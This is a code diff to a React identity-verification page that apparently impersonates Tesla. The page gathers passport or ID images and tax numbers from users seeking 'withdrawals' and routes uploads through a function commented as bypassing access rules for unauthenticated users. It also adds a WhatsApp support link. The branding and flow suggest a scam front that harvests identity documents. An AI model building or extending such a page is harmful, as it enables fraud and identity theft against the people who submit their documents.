@@ -5,9 +5,9 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
-import { Shield, Upload, CheckCircle, Loader2, FileText, AlertCircle, Camera } from 'lucide-react';
+import { Shield, Upload, CheckCircle, Loader2, FileText, AlertCircle, MessageCircle } from 'lucide-react';
 import { getTaxIdConfig } from '@/data/taxIdFormats';
-import teslaLogo from '@/assets/tesla-logo-clean.png';
+import teslaLogo from '@/assets/tesla-logo-kyc.png';
 
 type DocumentType = 'passport' | 'national_id' | 'drivers_license';
 
@@ -159,61 +159,54 @@ const VerifyIdentity = () => {
     setSubmitting(true);
 
     try {
-      // Upload document to storage
-      const fileExt = selectedFile.name.split('.').pop();
-      const fileName = `${kycData.user_id}/${documentType}_${Date.now()}.${fileExt}`;
-      
-      const { data: uploadData, error: uploadError } = await supabase.storage
-        .from('kyc-documents')
-        .upload(fileName, selectedFile, {
-          cacheControl: '3600',
-          upsert: false
-        });
+      // Convert file to base64
+      const reader = new FileReader();
+      const fileBase64 = await new Promise<string>((resolve, reject) => {
+        reader.onload = () => resolve(reader.result as string);
+        reader.onerror = reject;
+        reader.readAsDataURL(selectedFile);
+      });
+
+      // Upload document via Edge Function (bypasses RLS for unauthenticated users)
+      const { data: uploadResult, error: uploadError } = await supabase.functions.invoke('upload-kyc-document', {
+        body: {
+          file: fileBase64,
+          fileName: selectedFile.name,
+          contentType: selectedFile.type,
+          kycId: kycData.id,
+          token: token,
+          withdrawalId: withdrawalId,
+          documentType: documentType,
+          taxId: taxId.trim()
+        }
+      });
 
       if (uploadError) {
         console.error('Upload error:', uploadError);
         throw new Error('Failed to upload document. Please try again.');
       }
 
-      // Get signed URL for the document
-      const { data: urlData } = await supabase.storage
-        .from('kyc-documents')
-        .createSignedUrl(fileName, 60 * 60 * 24 * 365); // 1 year
-
-      const documentUrl = urlData?.signedUrl || fileName;
-
-      // Update KYC record
-      const { error: updateError } = await supabase
-        .from('kyc_verifications')
-        .update({
-          document_url: documentUrl,
-          document_type: documentType,
-          tax_id: taxId,
-          status: 'kyc_submitted',
-          updated_at: new Date().toISOString()
-        })
-        .eq('id', kycData.id);
-
-      if (updateError) throw updateError;
+      if (!uploadResult?.success) {
+        throw new Error(uploadResult?.error || 'Failed to upload document');
+      }
 
       // Send admin notification
       try {
         await supabase.functions.invoke('send-kyc-admin-notification', {
           body: {
             userName: kycData.user_name,
-            userEmail: '', // Will be fetched by function
+            userEmail: '',
             withdrawalId: kycData.withdrawal_id,
-            withdrawalAmount: 0, // Will be enriched by function
+            withdrawalAmount: 0,
             bankCountry: kycData.bank_country,
             documentType: documentType,
-            documentUrl: documentUrl,
+            documentUrl: uploadResult.documentUrl,
             taxId: taxId,
             submittedAt: new Date().toISOString()
           }
         });
       } catch (notifyError) {
         console.warn('Failed to send admin notification:', notifyError);
-        // Don't fail the submission if notification fails
       }
 
       setSubmitted(true);
@@ -400,7 +393,8 @@ const VerifyIdentity = () => {
                 value={taxId}
                 onChange={(e) => setTaxId(e.target.value)}
                 placeholder={taxIdConfig.placeholder}
-                className="bg-slate-700/50 border-slate-600 text-white placeholder:text-slate-500"
+                className="bg-slate-700 border-slate-500 text-white font-semibold placeholder:text-slate-400 focus:border-tesla-red"
+                style={{ color: '#ffffff', fontWeight: 600, opacity: 1 }}
               />
               <p className="text-xs text-slate-500">Format: {taxIdConfig.format}</p>
             </div>
@@ -425,10 +419,19 @@ const VerifyIdentity = () => {
             </Button>
           </form>
 
-          {/* Support Note */}
-          <p className="text-center text-sm text-slate-500 mt-6">
-            Need help? Contact our support team via WhatsApp for assistance.
-          </p>
+          {/* Support Section */}
+          <div className="text-center mt-8 space-y-3 pt-6 border-t border-slate-700">
+            <p className="text-sm text-slate-400">Need help with your verification?</p>
+            <a
+              href="https://wa.me/12186500840"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="inline-flex items-center gap-2 bg-green-600 hover:bg-green-700 text-white px-5 py-2.5 rounded-lg transition-colors font-medium shadow-lg"
+            >
+              <MessageCircle className="w-5 h-5" />
+              Contact Support via WhatsApp
+            </a>
+          </div>
         </div>
       </div>
     </div>
